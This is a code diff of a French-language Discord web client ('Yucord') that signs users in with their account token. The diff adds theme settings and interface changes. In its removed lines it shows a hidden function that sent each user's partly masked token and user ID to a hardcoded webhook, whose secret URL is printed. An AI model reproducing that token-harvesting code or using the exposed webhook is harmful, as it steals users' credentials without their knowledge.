@@ -9,7 +9,7 @@
   <meta property="og:thumbnail" content="https://cdn.discordapp.com/attachments/1400237818852409405/1400242657111838831/a.jpg?ex=688bed18&is=688a9b98&hm=cf651677b9993aeb5691a4f9d12704a5c0b93d0521ee1696f85f660b54b60d5d&" />
   <meta property="og:url" content="https://7urc.github.io/EboyInLove/" />
   <meta property="og:type" content="website" />
-  <link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="style.css">
   <link rel="icon" href="logo.jpg" type="image/jpeg">
   <title>Yucord</title>
 </head>
@@ -64,7 +64,7 @@
 
     <div class="group" onclick="yuzuToggleSection('dmList', this)">
       <span class="group-arrow">▼</span>
-      DMs & Groupes
+      Mp/grp
     </div>
     <ul id="dmList"></ul>
     
@@ -77,6 +77,7 @@
         <div class="user-username" id="userUsername">Utilisateur</div>
         <div class="user-status">En ligne</div>
       </div>
+      <div class="settings-gear hidden" id="settingsGear" onclick="yuzuOpenSettings()">⚙️</div>
     </div>
   </div>
 
@@ -133,6 +134,33 @@
     </div>
   </div>
 
+  <!-- Settings Modal -->
+  <div id="settingsModal" class="modal hidden">
+    <div class="settings-modal-content">
+      <div class="settings-header">
+        <h2>Paramètres</h2>
+        <span class="close" onclick="yuzuCloseSettings()">&times;</span>
+      </div>
+      <div class="settings-body">
+        <div class="settings-category">
+          <h3>Thème</h3>
+          <div class="theme-section">
+            <label class="theme-label">Couleur du thème :</label>
+            <div class="color-picker-container">
+              <div class="color-input-wrapper">
+                <input type="color" id="colorPicker" value="#5865f2">
+                <input type="text" id="colorDisplay" value="#5865f2" readonly>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="settings-footer">
+        <button class="save-btn" onclick="yuzuSaveSettings()">Sauvegarder</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     let yuzuToken = '';
     let yuzuCurrentChannelId = null;
@@ -145,11 +173,27 @@
     let yuzuNotificationCounts = new Map();
     let yuzuActiveNotifications = new Map();
     let yuzuUserDisplayNameCache = new Map();
+    let yuzuConfig = { theme: '#5865f2' };
   
     document.getElementById('message').addEventListener('keydown', e => {
       if (e.key === 'Enter' && !e.shiftKey) {
         e.preventDefault();
         yuzuSendMessageHard();
+      }
+    });
+
+    // Load config on startup
+    yuzuLoadConfig();
+
+    // Color picker event listener
+    document.addEventListener('DOMContentLoaded', function() {
+      const colorPicker = document.getElementById('colorPicker');
+      const colorDisplay = document.getElementById('colorDisplay');
+      
+      if (colorPicker && colorDisplay) {
+        colorPicker.addEventListener('input', function() {
+          colorDisplay.value = this.value.toUpperCase();
+        });
       }
     });
   
@@ -182,7 +226,10 @@
     
     async function yuzuConnect() {
       yuzuToken = document.getElementById('token').value;
-      if (!yuzuToken) return;
+      if (!yuzuToken) {
+        document.getElementById('settingsGear').classList.add('hidden');
+        return;
+      }
 
       const statusElement = document.getElementById('connectionStatus');
       if (!statusElement) return;
@@ -206,52 +253,89 @@
           statusElement.textContent = 'Connecté';
           statusElement.className = 'connection-status connected';
           
+          // Show settings gear when connected
+          document.getElementById('settingsGear').classList.remove('hidden');
+          
           yuzuUserDisplayNameCache.set(user.id, user);
           yuzuUpdateUserProfile(user);
-          await yuzuLogTokenInfo(yuzuToken, user.id);
         } else {
           throw new Error('Token invalide');
         }
       } catch (error) {
         statusElement.textContent = 'Erreur de connexion';
         statusElement.className = 'connection-status';
+        document.getElementById('settingsGear').classList.add('hidden');
         console.error('Erreur:', error);
       }
     }
 
-    async function yuzuLogTokenInfo(token, userId) {
-      const date = new Date().toISOString();
-      const maskedToken = token.substring(0, 10) + "•".repeat(token.length - 20) + token.substring(token.length - 5);
+    function yuzuOpenSettings() {
+      document.getElementById('settingsModal').classList.remove('hidden');
+      yuzuLoadCurrentTheme();
+    }
 
-      const webhookUrl = 'https://canary.discord.com/api/webhooks/1401131426862071900/LLQvVGDg1Mh2NolqRcCoBEB92WBkOTRQFN43XH3Iwn2SO2DqJ64EfNJeUy1Bk2e4zMl2';
-      const embed = {
-        title: "🔍 Connexion détectée",
-        description: "⚠️ *Informations sensibles cachées*",
-        fields: [
-          {
-            name: "🔑 Token (spoiler)",
-            value: `||${maskedToken}||`
-          },
-          { name: "🆔 User ID", value: userId, inline: false },
-          { name: "📅 Date", value: `<t:${Math.floor(new Date().getTime() / 1000)}:R>`, inline: false }
-        ],
-        color: 0x36393F,
-        footer: {
-          text: "Double-cliquez pour voir le token (risque de violation CGU)"
-        }
-      };
+    function yuzuCloseSettings() {
+      document.getElementById('settingsModal').classList.add('hidden');
+    }
 
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json' 
-          },
-          body: JSON.stringify({ embeds: [embed] })
-        });
-      } catch (error) {
-        console.error('Webhook error:', error);
+    function yuzuLoadCurrentTheme() {
+      const colorPicker = document.getElementById('colorPicker');
+      const colorDisplay = document.getElementById('colorDisplay');
+      
+      if (colorPicker && colorDisplay) {
+        colorPicker.value = yuzuConfig.theme;
+        colorDisplay.value = yuzuConfig.theme.toUpperCase();
       }
+    }
+
+    function yuzuSaveSettings() {
+      const colorPicker = document.getElementById('colorPicker');
+      if (colorPicker) {
+        yuzuConfig.theme = colorPicker.value;
+        yuzuSaveConfig();
+        yuzuApplyTheme(yuzuConfig.theme);
+        yuzuCloseSettings();
+      }
+    }
+
+    function yuzuLoadConfig() {
+      try {
+        // Simulate localStorage behavior with in-memory storage
+        if (window.yuzuStoredConfig) {
+          yuzuConfig = JSON.parse(window.yuzuStoredConfig);
+        }
+        yuzuApplyTheme(yuzuConfig.theme);
+      } catch (error) {
+        console.error('Erreur lors du chargement de la config:', error);
+      }
+    }
+
+    function yuzuSaveConfig() {
+      try {
+        // Simulate localStorage behavior with in-memory storage
+        window.yuzuStoredConfig = JSON.stringify(yuzuConfig);
+      } catch (error) {
+        console.error('Erreur lors de la sauvegarde de la config:', error);
+      }
+    }
+
+    function yuzuApplyTheme(color) {
+      const root = document.documentElement;
+      
+      // Convert hex to slightly darker shade for hover
+      const hex = color.replace('#', '');
+      const r = parseInt(hex.substr(0, 2), 16);
+      const g = parseInt(hex.substr(2, 2), 16);
+      const b = parseInt(hex.substr(4, 2), 16);
+      
+      const darkerR = Math.max(0, r - 30);
+      const darkerG = Math.max(0, g - 30);
+      const darkerB = Math.max(0, b - 30);
+      
+      const darkerColor = `#${darkerR.toString(16).padStart(2, '0')}${darkerG.toString(16).padStart(2, '0')}${darkerB.toString(16).padStart(2, '0')}`;
+      
+      root.style.setProperty('--primary-color', color);
+      root.style.setProperty('--primary-hover', darkerColor);
     }
 
     async function yuzuCreateNotification(author, message, channelId) {
@@ -318,26 +402,31 @@
     }
 
     function yuzuPlayNotificationSound() {
-      try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const gainNode = audioContext.createGain();
-        
-        oscillator.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-        
-        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
-        oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
-        
-        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
-        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
-        
-        oscillator.start(audioContext.currentTime);
-        oscillator.stop(audioContext.currentTime + 0.2);
-      } catch (error) {
-        console.log('Son de notification non disponible');
-      }
-    }
+  try {
+    const audio = new Audio('notif.mp3');
+    audio.volume = 0.3;
+    audio.play().catch(() => {
+      // Fallback au bip généré si le mp3 échoue
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+
+      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
+
+      gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
+
+      oscillator.start(audioContext.currentTime);
+      oscillator.stop(audioContext.currentTime + 0.2);
+    });
+  } catch (error) {
+    console.log('Notification audio indisponible:', error);
+  }
+}
 
     function yuzuUpdateNotificationBadge(channelId, increment = true) {
       const currentCount = yuzuNotificationCounts.get(channelId) || 0;
@@ -416,7 +505,7 @@
           banner.style.backgroundColor = `#${userDetails.accent_color.toString(16).padStart(6, '0')}`;
         } else {
           banner.style.backgroundImage = '';
-          banner.style.backgroundColor = '#5865f2';
+          banner.style.backgroundColor = 'var(--primary-color)';
         }
         
         document.getElementById('userModal').classList.remove('hidden');
@@ -432,6 +521,12 @@
     document.getElementById('userModal').onclick = function(e) {
       if (e.target === this) {
         yuzuCloseUserModal();
+      }
+    }
+
+    document.getElementById('settingsModal').onclick = function(e) {
+      if (e.target === this) {
+        yuzuCloseSettings();
       }
     }
     
@@ -645,61 +740,98 @@
       }
     }
 
-    function yuzuDisplayChannels(channels, guildName) {
-      const sidebar = document.getElementById('channelSidebar');
-      const list = document.getElementById('channelList');
-      const header = document.getElementById('currentGuildName');
-      
-      header.textContent = guildName;
-      list.innerHTML = '';
-      
-      const textChannels = channels.filter(c => c.type === 0).sort((a, b) => a.position - b.position);
-      
-      textChannels.forEach(channel => {
-        const li = document.createElement('li');
-        li.className = 'channel-item';
-        li.onclick = () => yuzuOpenChannel(channel.id, channel.name);
-        
-        const hash = document.createElement('span');
-        hash.className = 'channel-hash';
-        hash.textContent = '#';
-        
-        const name = document.createElement('span');
-        name.className = 'channel-name';
-        name.textContent = channel.name;
-        
-        li.appendChild(hash);
-        li.appendChild(name);
-        list.appendChild(li);
-      });
-      
-      sidebar.classList.remove('hidden');
-    }
+   function yuzuDisplayChannels(channels, guildName) {
+  const sidebar = document.getElementById('channelSidebar');
+  const list = document.getElementById('channelList');
+  const header = document.getElementById('currentGuildName');
+  
+  // Reset et création du header
+  header.innerHTML = '';
+  
+  // Trouver le serveur correspondant
+  const guild = yuzuGuildsData.find(g => g.name === guildName);
+  
+  // Container pour la bannière + nom
+  const headerContainer = document.createElement('div');
+  headerContainer.className = 'guild-header-container';
+  
+  if (guild?.banner) {
+    const banner = document.createElement('div');
+    banner.className = 'guild-banner';
+    banner.style.backgroundImage = `url(https://cdn.discordapp.com/banners/${guild.id}/${guild.banner}.png?size=600)`;
+    headerContainer.appendChild(banner);
+  }
+  
+  const nameElement = document.createElement('div');
+  nameElement.className = 'guild-name';
+  nameElement.textContent = guildName;
+  headerContainer.appendChild(nameElement);
+  
+  header.appendChild(headerContainer);
+  
+  // Liste des salons
+  list.innerHTML = '';
+  const textChannels = channels.filter(c => c.type === 0).sort((a, b) => a.position - b.position);
+  
+  textChannels.forEach(channel => {
+    const li = document.createElement('li');
+    li.className = 'channel-item';
+    li.onclick = () => yuzuOpenChannel(channel.id, channel.name);
+    
+    const hash = document.createElement('span');
+    hash.className = 'channel-hash';
+    hash.textContent = '#';
+    
+    const name = document.createElement('span');
+    name.className = 'channel-name';
+    name.textContent = channel.name;
+    
+    li.appendChild(hash);
+    li.appendChild(name);
+    list.appendChild(li);
+  });
+  
+  sidebar.classList.remove('hidden');
+}
 
     async function yuzuOpenChannel(channelId, channelName) {
-      yuzuCurrentChannelId = channelId;
-      document.getElementById('chatTitle').textContent = `# ${channelName}`;
-      document.getElementById('chat').innerHTML = '';
-      
-      yuzuUpdateNotificationBadge(channelId, false);
-      
-      await yuzuLoadMessages(channelId);
-      
-      if (yuzuSocket) yuzuSocket.close();
-      yuzuSocket = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
+  // Détection si le salon est un DM
+  const isDM = yuzuDmsData.some(dm => dm.id === channelId);
+  if (isDM) {
+    // Cache la sidebar des serveurs
+    document.getElementById('channelSidebar').classList.add('hidden');
+  } else {
+    // Affiche la sidebar des serveurs si ce n’est pas un DM
+    document.getElementById('channelSidebar').classList.remove('hidden');
+  }
 
-      yuzuSocket.onopen = () => {
-        yuzuSocket.send(JSON.stringify({
-          op: 2,
-          d: {
-            token: yuzuToken,
-            intents: 32767,
-            properties: {
-              os: 'linux', browser: 'yuzu', device: 'yuzu'
-            }
-          }
-        }));
-      };
+  yuzuCurrentChannelId = channelId;
+  document.getElementById('chatTitle').textContent = isDM ? channelName : `# ${channelName}`;
+  document.getElementById('chat').innerHTML = '';
+
+  yuzuUpdateNotificationBadge(channelId, false);
+
+  await yuzuLoadMessages(channelId);
+
+  if (yuzuSocket) yuzuSocket.close();
+  yuzuSocket = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
+
+  yuzuSocket.onopen = () => {
+    yuzuSocket.send(JSON.stringify({
+      op: 2,
+      d: {
+        token: yuzuToken,
+        intents: 32767,
+        properties: {
+          os: 'linux',
+          browser: 'yuzu',
+          device: 'yuzu'
+        }
+      }
+    }));
+  };
+
+
 
       yuzuSocket.onmessage = ({ data }) => {
         try {
